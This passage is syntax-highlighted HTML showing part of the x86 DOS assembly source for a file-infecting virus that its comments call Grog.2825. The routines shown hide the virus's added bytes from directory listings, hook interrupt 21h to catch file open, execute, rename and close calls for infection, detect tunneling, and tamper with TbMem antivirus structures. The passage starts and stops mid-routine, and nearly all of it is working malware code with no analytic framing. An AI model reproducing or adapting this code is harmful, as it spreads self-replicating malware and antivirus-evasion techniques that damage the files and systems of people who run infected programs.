         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">fcb_ste_exit</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to fcb_ste_exit</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">        </span><span class="sc1">; Save registers at stack</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">51h</span><span class="sc0">      </span><span class="sc1">; Get current PSP address</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; ES = segment of PSP for current ...</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Parent PSP equal to current PSP?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">fcb_dont_ste</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to fcb_dont_ste</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; BX = offset of unopened FCB</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; AL = extended FCB</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2fh</span><span class="sc0">      </span><span class="sc1">; Get disk transfer area address</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Load AX from stack</span><span class="sc0">

         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">; Extended FCB?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_extended</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to not_extended</span><span class="sc0">

         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc0">      </span><span class="sc1">; BX = offset of normal FCB</span><span class="sc0">
</span><span class="sc5">not_extended</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; AX = file time</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00011111b</span><span class="sc0">    </span><span class="sc1">; AL = seconds of file time</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00010001b</span><span class="sc0">    </span><span class="sc1">; Infected (34 seconds)?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">fcb_dont_ste</span><span class="sc0">    </span><span class="sc1">; Not infected? Jump to fcb_dont_ste</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">09h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; AL = byte of filename</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01011111b</span><span class="sc0">    </span><span class="sc1">; Upcase character</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'E'</span><span class="sc0">              </span><span class="sc1">; EXE executable?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">fcb_e_o_test</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to fcb_e_o_test</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'O'</span><span class="sc0">              </span><span class="sc1">; Overlay executable?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">fcb_e_o_test</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to fcb_e_o_test</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'C'</span><span class="sc0">              </span><span class="sc1">; COM executable?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">fcb_dont_ste</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to fcb_dont_ste</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1dh</span><span class="sc4">],(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">)*</span><span class="sc2">02h</span><span class="sc4">+</span><span class="sc2">100h</span><span class="sc0">
         </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">fcb_dont_ste</span><span class="sc0">    </span><span class="sc1">; Filesize too small? Jump to fcb_...</span><span class="sc0">

         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1dh</span><span class="sc4">],(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">)</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">fcb_dont_ste</span><span class="sc0">
</span><span class="sc5">fcb_e_o_test</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1fh</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">fcb_e_o_stea</span><span class="sc0">    </span><span class="sc1">; Filesize not too small? Jump to ...</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1dh</span><span class="sc4">],(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">)*</span><span class="sc2">02h</span><span class="sc4">+</span><span class="sc2">100h</span><span class="sc0">
         </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">fcb_dont_ste</span><span class="sc0">    </span><span class="sc1">; Filesize too small? Jump to fcb_...</span><span class="sc0">
</span><span class="sc5">fcb_e_o_stea</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1dh</span><span class="sc4">],(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">+</span><span class="sc2">110h</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1fh</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">fcb_dont_ste</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">        </span><span class="sc1">; Load registers from stack</span><span class="sc0">
</span><span class="sc5">fcb_ste_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">iret</span><span class="sc0">            </span><span class="sc1">; Interrupt return!</span><span class="sc0">
</span><span class="sc5">jmp_dta_stea</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">dta_stealth</span><span class="sc0">
</span><span class="sc5">jmp_fcb_stea</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">fcb_stealth</span><span class="sc0">

</span><span class="sc5">int21_virus</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Interrupt 21h of Grog.2825</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">          </span><span class="sc1">; Save BP at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">       </span><span class="sc1">; BP = stack pointer</span><span class="sc0">
         </span><span class="sc6">cli</span><span class="sc0">             </span><span class="sc1">; Clear interrupt-enable flag</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc12">'Gg'</span><span class="sc0">       </span><span class="sc1">; Store 'Gg' at stack</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc12">'Gg'</span><span class="sc0">       </span><span class="sc1">; Tunneling?</span><span class="sc0">
         </span><span class="sc6">sti</span><span class="sc0">             </span><span class="sc1">; Set interrupt-enable flag</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">          </span><span class="sc1">; Load BP from stack</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">jmp_tst_vir_</span><span class="sc0">    </span><span class="sc1">; No tunneling? Jump to jmp_tst_vir_</span><span class="sc0">

         </span><span class="sc6">iret</span><span class="sc0">            </span><span class="sc1">; Interrupt return!</span><span class="sc0">
</span><span class="sc5">jmp_tst_vir_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">tst_vir_func</span><span class="sc0">
</span><span class="sc5">test_functio</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cld</span><span class="sc0">             </span><span class="sc1">; Clear direction flag</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc0">      </span><span class="sc1">; Find first matching file (DTA)?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">jmp_dta_stea</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to jmp_dta_stea</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc0">      </span><span class="sc1">; Find next matching file (DTA)?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">jmp_dta_stea</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to jmp_dta_stea</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">11h</span><span class="sc0">      </span><span class="sc1">; Find first matching file (DTA)?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">jmp_fcb_stea</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to jmp_fcb_stea</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc0">      </span><span class="sc1">; Find next matching file (DTA)?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">jmp_fcb_stea</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to jmp_fcb_stea</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2521h</span><span class="sc0">        </span><span class="sc1">; Set interrupt vector 21h?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">tst_get_int_</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to tst_get_int_</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21_origin</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21_origin</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">

         </span><span class="sc6">iret</span><span class="sc0">            </span><span class="sc1">; Interrupt return!</span><span class="sc0">
</span><span class="sc5">tst_get_int_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3521h</span><span class="sc0">        </span><span class="sc1">; Get interrupt vector 21h?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">tst_grog_fun</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to tst_grog_fun</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21_origin</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21_origin</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">

         </span><span class="sc6">iret</span><span class="sc0">            </span><span class="sc1">; Interrupt return!</span><span class="sc0">
</span><span class="sc5">tst_grog_fun</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">8e47h</span><span class="sc0">        </span><span class="sc1">; Grog.2825 function?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">grog_functi_</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to grog_functi_</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">8e67h</span><span class="sc0">        </span><span class="sc1">; Grog.2825 function?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">grog_functi</span><span class="sc0">     </span><span class="sc1">; Equal? Jump to grog_functi</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3dh</span><span class="sc0">      </span><span class="sc1">; Open file?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">jmp_tst_clos</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to jmp_tst_clos</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">41h</span><span class="sc0">      </span><span class="sc1">; Delete file?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">jmp_tst_clos</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to jmp_tst_clos</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">43h</span><span class="sc0">      </span><span class="sc1">; Get or set file attributes?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">jmp_tst_clos</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to jmp_tst_clos</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4bh</span><span class="sc0">      </span><span class="sc1">; Load and/or execute program?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">jmp_tst_clos</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to jmp_tst_clos</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">56h</span><span class="sc0">      </span><span class="sc1">; Rename file?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">jmp_tst_clos</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to jmp_tst_clos</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">6c00h</span><span class="sc0">        </span><span class="sc1">; Extended open/create?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">jmp_tst_clos</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to jmp_tst_clos</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">      </span><span class="sc1">; Close file?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">jmp_tst_clos</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to jmp_tst_clos</span><span class="sc0">
</span><span class="sc5">int21_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0eah</span><span class="sc0">        </span><span class="sc1">; JMP imm32 (opcode 0eah)</span><span class="sc0">
</span><span class="sc5">int21_origin</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Address of interrupt 21h</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc5">jmp_tst_clos</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">test_close</span><span class="sc0">
</span><span class="sc5">grog_functi</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">06</span><span class="sc0">       </span><span class="sc1">; Correct stack pointer</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">int20_exit</span><span class="sc0">
</span><span class="sc5">grog_functi_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">        </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Zero AX</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; ES = segment of interrupt table</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int01_addr</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">01h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Set interrupt offset 01h</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int01_addr</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">01h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Set interrupt segment 01h</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Save DS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Load ES from stack (DS)</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">com_exe_ov</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">    </span><span class="sc1">; EXE/Overlay executable?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">exe_ov_exit</span><span class="sc0">     </span><span class="sc1">; Equal? Jump to exe_ov_exit</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc5">origin_off</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; SI = offset of original code of ...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">         </span><span class="sc1">; AX = offset of beginning of code</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; SI = offset of original code</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; DI = offset of beginning of code</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">)</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Save registers at stack</span><span class="sc0">

         </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">       </span><span class="sc1">; Move the original code</span><span class="sc0">
</span><span class="sc5">test_retro</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">retro_struc</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">retro_struc</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">zero_regs</span><span class="sc0">       </span><span class="sc1">; No TbMem retro structures? Jump ...</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">       </span><span class="sc1">; Save segments at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Windows enhanced-mode initializa...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1605h</span><span class="sc0">        </span><span class="sc1">; Windows enhanced mode &amp; 286 DOSx...</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">2fh</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">       </span><span class="sc1">; AX = segment of startup info str...</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">70h</span><span class="sc0">      </span><span class="sc1">; Segment of DOS?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">dont_retro</span><span class="sc0">      </span><span class="sc1">; Equal? Jump to dont_retro</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2fh</span><span class="sc0">      </span><span class="sc1">; Interrupt 2fh (multiplex)</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">tbmem_retro</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc0">      </span><span class="sc1">; Interrupt 09h (keyboard data ready)</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">tbmem_retro</span><span class="sc0">
</span><span class="sc5">dont_retro</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">       </span><span class="sc1">; Load segments from stack</span><span class="sc0">
</span><span class="sc5">zero_regs</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Zero AX</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Zero BX</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Zero CX</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Zero DX</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Zero BP</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">         </span><span class="sc1">; SI = offset of beginning of code</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; DI =   "    "      "     "   "</span><span class="sc0">

         </span><span class="sc6">retf</span><span class="sc0">            </span><span class="sc1">; Return far!</span><span class="sc0">
</span><span class="sc5">exe_ov_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">stack_seg</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">         </span><span class="sc1">; DI = offset of beginning of code</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'G'</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosb</span><span class="sc0">       </span><span class="sc1">; Overwrite virus with the charact...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">62h</span><span class="sc0">      </span><span class="sc1">; Get current PSP address</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">

         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">      </span><span class="sc1">; BX = segment of beginning of code</span><span class="sc0">
